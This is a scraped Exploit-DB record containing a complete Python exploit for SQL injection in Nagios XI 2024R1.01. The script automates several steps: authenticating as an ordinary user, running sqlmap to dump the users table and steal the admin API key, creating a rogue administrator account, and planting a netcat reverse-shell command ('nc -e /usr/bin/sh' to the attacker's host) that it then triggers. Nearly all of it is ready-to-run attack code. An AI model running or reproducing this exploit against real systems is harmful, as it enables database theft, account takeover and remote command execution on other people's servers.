{"source": "https://www.exploit-db.com/exploits/51925", "vulnName": "Nagios XI Version 2024R1.01 - SQL Injection", "vulnEDBID": "51925", "vulnCVE": "N/A", "author": "JAROD JASLOW (MAWK)", "exploitType": "WEBAPPS", "platform": "MULTIPLE", "datePublished": "2024-03-25", "vulnContent": "# Exploit Title: NAGIOS XI SQLI\n# Google Dork: [if applicable]\n# Date: 02/26/2024\n# Exploit Author: Jarod Jaslow (MAWK) https://www.linkedin.com/in/jarod-jaslow-codename-mawk-265144201/\n# Vendor Homepage: https://www.nagios.com/changelog/#nagios-xi\n# Software Link: https://github.com/MAWK0235/CVE-2024-24401\n# Version: Nagios XI Version 2024R1.01\n# Tested on: Nagios XI Version 2024R1.01 LINUX\n# CVE : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-24401\n#\n\nimport requests\nimport subprocess\nimport argparse\nimport re\nimport urllib3\nimport os\nimport random\nimport string\nfrom colorama import Fore, Style\n\nurllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n\n\n\ndef serviceLogin(user,password):\n    r = requests.post(f'http://{IP}/nagiosxi/api/v1/authenticate?pretty=1',data={'username':user,'password':password,\"valid_min\":\"5\"},verify=False)  \n    print(f\"{Fore.MAGENTA}[+] Authenticating with captured credtials to API....\")\n    match = re.search(r'auth_token\": \"(.*)\"',r.text)\n    if match:\n        token = match.group(1)\n        print(f'{Fore.MAGENTA}[+] Token: ' + token)\n        r = requests.get(f'http://{IP}/nagiosxi/login.php?token={token}', verify=False)\n        cookie = r.headers['Set-Cookie']\n        cookie = cookie.split(',')[0]\n        match = re.search(r'nagiosxi=(.*);', cookie)\n        cookie = match.group(1)\n        print(f\"{Fore.MAGENTA}[+] Auth cookie is: \" + cookie)\n        return cookie\n    else:\n        print(f'{Fore.RED}[-] Authentication Failed..{Style.RESET_ALL}')\n        exit()\n\ndef sqlmap(IP,username,password):\n    \n    print(f'{Fore.MAGENTA}[+] Starting SQLMAP...')\n    session = requests.session()\n    s = session.get(f'http://{IP}/nagiosxi/index.php', verify=False)\n    match = re.search(r'var nsp_str = \\\"(.*?)\\\"', s.text)\n    nsp = match.group(1)\n    print(f\"{Fore.MAGENTA}[+] NSP captured: \" + nsp)\n    data = {\"nsp\": nsp, \"page\": \"auth\", \"debug\": '', \"pageopt\": \"login\", \"username\": username, \"password\": password, \"loginButton\": ''}\n    s = session.post(f'http://{IP}/nagiosxi/login.php', data=data)\n    print(f\"{Fore.MAGENTA}[+] Authenticated as User..\")\n    print(f\"{Fore.MAGENTA}[+] Accepting license Agreement...\")\n    s = session.get(f'http://{IP}/nagiosxi/login.php?showlicense', verify=False)\n    match = re.search(r'var nsp_str = \\\"(.*?)\\\"', s.text)\n    nsp = match.group(1)\n    data = {\"page\": \"/nagiosxi/login.php\", \"pageopt\": \"agreelicense\", \"nsp\": nsp, \"agree_license\": \"on\"}\n    session.post(f\"http://{IP}/nagiosxi/login.php?showlicense\", data=data)\n    print(f\"{Fore.MAGENTA}[+] Performing mandatory password change ARGH\")\n    newPass = \"mawk\"\n    data = {\"page\": \"/nagiosxi/login.php\", \"pageopt\": \"changepass\", \"nsp\": nsp,\"current_password\": password, \"password1\": newPass, \"password2\": newPass, \"reporttimesubmitbutton\": ''}\n    session.post(f\"http://{IP}/nagiosxi/login.php?forcepasswordchange\", data=data)\n    s= session.get(f'http://{IP}/nagiosxi/')\n    match = re.search(r'var nsp_str = \\\"(.*?)\\\"', s.text)\n    nsp = match.group(1)\n    cookie = s.cookies.get('nagiosxi')\n    sqlmap_command = f'sqlmap --flush-session -u \"http://{IP}/nagiosxi//config/monitoringwizard.php/1*?update=1&nextstep=2&nsp={nsp}&wizard=mysqlserver\" --cookie=\"nagiosxi={cookie}\" --dump -D nagiosxi -T xi_users --drop-set-cookie --technique=ET --dbms=MySQL -p id --risk=3 --level=5 --threads=10 --batch'\n    #print(sqlmap_command)\n    sqlmap_command_output = subprocess.Popen(sqlmap_command,shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True )\n    try:\n        for line in iter(sqlmap_command_output.stdout.readline, ''):\n            if \"| Nagios Administrator |\" in line:\n                match = re.search(r\"Nagios Administrator \\| (.*?) \\|\", line)\n                if match:\n                    adminKey= match.group(1)\n                    print(f\"{Fore.MAGENTA}[+] Admin Key recovered: \" + adminKey)\n                    return adminKey\n                else:\n                    print(f\"{Fore.RED}[-] Could not pull Admin Key :(....{Style.RESET_ALL}\")\n                    exit()\n                break\n        print(\"[-] SQLMAP capture FAILED..\")\n        sqlmap_command_output.terminate()\n\n    except KeyboardInterrupt:\n        print(f\"{Fore.RED}[-] SQLMAP interrupted. Cleaning up...{Style.RESET_ALL}\")\n        sqlmap_command_output.terminate()\n        sqlmap_command_output.communicate()\n        exit()\n\ndef createAdmin(IP,adminKey):\n    characters = string.ascii_letters + string.digits\n    random_username = ''.join(random.choice(characters) for i in range(5))\n    random_password = ''.join(random.choice(characters) for i in range(5))\n\n    data = {\"username\": random_username, \"password\": random_password, \"name\": random_username, \"email\": f\"{random_username}@mail.com\", \"auth_level\": \"admin\"}\n    r = requests.post(f'http://{IP}/nagiosxi/api/v1/system/user?apikey={adminKey}&pretty=1', data=data, verify=False)\n    if \"success\" in r.text:\n        print(f'{Fore.MAGENTA}[+] Admin account created...')\n        return random_username, random_password\n    else:\n        print(f'{Fore.RED}[-] Account Creation Failed!!! :(...{Style.RESET_ALL}')\n        print(r.text)\n        exit()\n\ndef start_HTTP_server():\n    subprocess.Popen([\"python\", \"-m\", \"http.server\", \"8000\"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n\ndef adminExploit(adminUsername, adminPassword, IP, LHOST,LPORT):\n    print(f\"{Fore.MAGENTA}[+] Conducting mandatory password change...\")\n    session = requests.session()\n    s = session.get(f'http://{IP}/nagiosxi/index.php', verify=False)\n    match = re.search(r'var nsp_str = \\\"(.*?)\\\"', s.text)\n    nsp = match.group(1)\n    print(f\"{Fore.MAGENTA}[+] NSP captured: \" + nsp)\n    data = {\"nsp\": nsp, \"page\": \"auth\", \"debug\": '', \"pageopt\": \"login\", \"username\": adminUsername, \"password\": adminPassword, \"loginButton\": ''}\n    s = session.post(f'http://{IP}/nagiosxi/login.php', data=data)\n    print(f\"{Fore.MAGENTA}[+] Authenticated as admin..\")\n    print(f\"{Fore.MAGENTA}[+] Accepting license Agreement...\")\n    s = session.get(f'http://{IP}/nagiosxi/login.php?showlicense', verify=False)\n    match = re.search(r'var nsp_str = \\\"(.*?)\\\"', s.text)\n    nsp = match.group(1)\n    data = {\"page\": \"/nagiosxi/login.php\", \"pageopt\": \"agreelicense\", \"nsp\": nsp, \"agree_license\": \"on\"}\n    session.post(f\"http://{IP}/nagiosxi/login.php?showlicense\", data=data)\n    print(f\"{Fore.MAGENTA}[+] Performing mandatory password change ARGH\")\n    newAdminPass = adminUsername + adminPassword\n    data = {\"page\": \"/nagiosxi/login.php\", \"pageopt\": \"changepass\",\"current_password\": adminPassword, \"nsp\": nsp, \"password1\": newAdminPass, \"password2\": newAdminPass, \"reporttimesubmitbutton\": ''}\n    session.post(f\"http://{IP}/nagiosxi/login.php?forcepasswordchange\", data=data)\n    print(f\"{Fore.MAGENTA}[+] Creating new command...\")\n    data = {\"tfName\": adminUsername, \"tfCommand\": f\"nc -e /usr/bin/sh {LHOST} {LPORT}\", \"selCommandType\": \"1\", \"chbActive\": \"1\", \"cmd\": \"submit\", \"mode\": \"insert\", \"hidId\": \"0\", \"hidName\": '', \"hidServiceDescription\": '', \"hostAddress\": \"127.0.0.1\", \"exactType\": \"command\", \"type\": \"command\", \"genericType\": \"command\"}\n    session.post(f'http://{IP}/nagiosxi/includes/components/ccm/index.php?type=command&page=1', data=data)\n    data = {\"cmd\": '', \"continue\": ''}\n    start_HTTP_server()\n    print(f\"{Fore.MAGENTA}[+] Created command: \" + adminUsername)\n    session.post(f'http://{IP}/nagiosxi/includes/components/nagioscorecfg/applyconfig.php?cmd=confirm', data=data)\n    data = {\"search\": adminUsername}\n    s = session.post(f'http://{IP}/nagiosxi/includes/components/ccm/index.php?cmd=view&type=command&page=1', data=data)\n    match = re.search(r\"javascript:actionPic\\('deactivate','(.*?)','\", s.text)\n    if match:\n        commandCID = match.group(1)\n        print(f\"{Fore.MAGENTA}[+] Captured Command CID: \" + commandCID)\n        s = session.get(f\"http://{IP}/nagiosxi/includes/components/ccm/?cmd=view&type=service\")\n        match = re.search(r'var nsp_str = \\\"(.*?)\\\"', s.text)\n        if match:\n            nsp = match.group(1)\n            s = session.get(f\"http://{IP}/nagiosxi/includes/components/ccm/command_test.php?cmd=test&mode=test&cid={commandCID}&nsp={nsp}\")\n            os.system(\"kill -9 $(lsof -t -i:8000)\")\n            print(f\"{Fore.RED}[+] CHECK UR LISTENER\")\n        else:\n            print(f\"{Fore.RED}[-] ERROR\")\n    else:\n        print(f\"{Fore.RED}[-] Failed to capture Command CID..{Style.RESET_ALL}\")\n\n\n\n\nif __name__ == '__main__':\n    ascii_art = f\"\"\"{Fore.LIGHTRED_EX}\n\u2588\u2588\u2588\u2557   \u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2557    \u2588\u2588\u2557\u2588\u2588\u2557  \u2588\u2588\u2557    \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\n\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2551    \u2588\u2588\u2551\u2588\u2588\u2551 \u2588\u2588\u2554\u255d    \u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u255a\u2550\u2550\u2588\u2588\u2554\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\n\u2588\u2588\u2554\u2588\u2588\u2588\u2588\u2554\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2551 \u2588\u2557 \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2554\u255d     \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551     \u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d   \u2588\u2588\u2551   \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\n\u2588\u2588\u2551\u255a\u2588\u2588\u2554\u255d\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2551\u2588\u2588\u2551\u2588\u2588\u2588\u2557\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2588\u2588\u2557     \u255a\u2550\u2550\u2550\u2550\u2588\u2588\u2551\u2588\u2588\u2551     \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2550\u255d    \u2588\u2588\u2551   \u255a\u2550\u2550\u2550\u2550\u2588\u2588\u2551\n\u2588\u2588\u2551 \u255a\u2550\u255d \u2588\u2588\u2551\u2588\u2588\u2551  \u2588\u2588\u2551\u255a\u2588\u2588\u2588\u2554\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551  \u2588\u2588\u2557    \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551  \u2588\u2588\u2551\u2588\u2588\u2551\u2588\u2588\u2551        \u2588\u2588\u2551   \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551\n\u255a\u2550\u255d     \u255a\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u255d \u255a\u2550\u2550\u255d\u255a\u2550\u2550\u255d \u255a\u2550\u255d  \u255a\u2550\u255d    \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u255d\u255a\u2550\u255d\u255a\u2550\u255d        \u255a\u2550\u255d   \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\n     {Style.RESET_ALL}                                                                                      \n    \"\"\"\n    print(ascii_art)\n    parser = argparse.ArgumentParser(description=\"AutoPwn Script for Bizness HTB machine\", usage= \"sudo Nagios.py <Target IP>  <LHOST> <LPORT>\")\n    parser.add_argument('IP' ,help= \"Target IP \")\n    parser.add_argument('LHOST',help= \"Local host\")\n    parser.add_argument('LPORT' ,help= \"Listening Port\")\n\n    args = parser.parse_args()\n    min_required_args = 3\n    if len(vars(args)) != min_required_args:\n        parser.print_usage()\n        exit()\n\n    adminUsername, adminPassword = createAdmin(args.IP, sqlmap(args.IP,input(f\"{Fore.MAGENTA}[+] Please insert a non-administrative username: \"),input(f\"{Fore.MAGENTA}[+] Please insert the password: \")))\n    print(f\"{Fore.MAGENTA}[+] Admin Username=\" + adminUsername)\n    print(f\"{Fore.MAGENTA}[+] Admin Password=\" + adminPassword)\n    adminExploit(adminUsername, adminPassword, args.IP,args.LHOST,args.LPORT)\n            "}